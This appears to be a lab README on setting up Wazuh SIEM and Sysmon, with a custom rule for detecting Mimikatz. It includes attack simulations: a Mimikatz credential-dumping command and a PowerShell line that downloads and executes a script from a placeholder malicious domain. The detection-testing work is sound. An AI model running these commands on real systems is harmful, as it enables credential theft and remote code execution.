# Security Monitoring & Threat Detection with Wazuh

## Overview

This project demonstrates how to set up a security monitoring and threat detection system using Wazuh SIEM. The focus is on detecting malicious activity, including Mimikatz execution, and analyzing security events in a cloud-based lab. This setup provides a hands-on approach to understanding real-world security threats and how to mitigate them through log monitoring and rule-based detection.

## Technologies Used

- **Wazuh SIEM** (Security Information and Event Management) – Centralized log collection and analysis.
- **Sysmon** (System Monitoring for Windows event logging) – Enhances logging capabilities for deeper event visibility.
- **PowerShell** (Attack simulations and scripting) – Used for executing controlled attacks.
- **Mimikatz** (Credential dumping tool for testing detection capabilities) – Simulates real-world credential theft attacks.

---

## Deployment Steps

### 1. Set Up Wazuh SIEM on Ubuntu

Wazuh SIEM was chosen for its open-source capabilities and strong log management features. Setting it up on Ubuntu ensures stability and security for handling log data.

#### Update System and Install Dependencies

Before installing Wazuh, it is crucial to ensure that the system is up-to-date and has necessary dependencies installed.

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install curl unzip -y
```

#### Install Wazuh Manager

The Wazuh Manager is the core component that processes security alerts from connected agents. The installation script automates the process.

```bash
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
sudo bash wazuh-install.sh --manager
```

#### Start Wazuh Services

After installation, Wazuh services must be started and enabled to ensure they run on boot.

```bash
sudo systemctl enable wazuh-manager
sudo systemctl start wazuh-manager
```

### 2. Install and Configure Wazuh Agent on Windows (Sysmon Enabled)

The Wazuh Agent collects logs from Windows machines and sends them to the Wazuh Manager. Sysmon enhances the visibility of security-related events.

#### Install Sysmon

Sysmon is a Windows utility that provides detailed logging of process activity, network connections, and more. It is essential for detecting advanced threats.

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "Sysmon.zip"
Expand-Archive .\Sysmon.zip -DestinationPath .\Sysmon
cd .\Sysmon
.\sysmon.exe -accepteula -i sysmon.xml
```

#### Install Wazuh Agent

The Wazuh Agent installation connects the Windows machine to the Wazuh SIEM and allows it to send logs for analysis.

```powershell
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.x.msi" -OutFile "wazuh-agent.msi"
Start-Process msiexec.exe -ArgumentList "/i wazuh-agent.msi /qn WAZUH_MANAGER='YOUR_WAZUH_SERVER_IP'" -Wait
Start-Service WazuhSvc
```

### 3. Configure Custom Wazuh Rules for Mimikatz Detection

To effectively detect attacks, custom rules were created within Wazuh. The rule below specifically detects the execution of Mimikatz, a common credential theft tool.

Create a new rule file:

```bash
sudo nano /var/ossec/rules/mimikatz_rules.xml
```

Add the following custom rule:

```xml
<group name="mimikatz_detection, attack_tool">
  <rule id="100001" level="12">
    <decoded_as>json</decoded_as>
    <field name="win.eventdata.Image">.*mimikatz.exe.*</field>
    <description>Mimikatz execution detected</description>
  </rule>
</group>
```

Restart Wazuh Manager to apply rules:

```bash
sudo systemctl restart wazuh-manager
```

### 4. Simulate Attacks with PowerShell

Simulating attacks is necessary to test whether security monitoring is effective. These tests ensure that the detection rules work as expected.

#### Simulate Mimikatz Execution

Mimikatz is used to dump credentials from memory. Running it helps confirm whether the Wazuh rule successfully detects its execution.

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
Expand-Archive .\mimikatz.zip -DestinationPath .\mimikatz
cd .\mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords"
```

#### Simulate Other Suspicious Activities

Other attack methods were tested to evaluate how well Wazuh and Sysmon detect malicious PowerShell activity.

```powershell
# Simulate PowerShell Download Attack
IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/malware.ps1')

# Simulate Command Execution via Encoded Payload
powershell -EncodedCommand JABXAG8AbgB0AC4ARQB4AGUA…
```

These attack simulations help validate the security monitoring setup and improve detection capabilities.

---

## Conclusion

This project successfully demonstrates how to:

- Deploy Wazuh SIEM for security monitoring.
- Enhance endpoint visibility using Sysmon.
- Detect malicious activity, including Mimikatz execution.
- Simulate attacks using PowerShell to test detection rules.

By leveraging Wazuh SIEM and Sysmon, security teams can enhance their ability to detect and respond to potential threats in a monitored environment. These techniques are fundamental for security operations centers (SOC) and threat hunting teams aiming to improve detection and response capabilities.

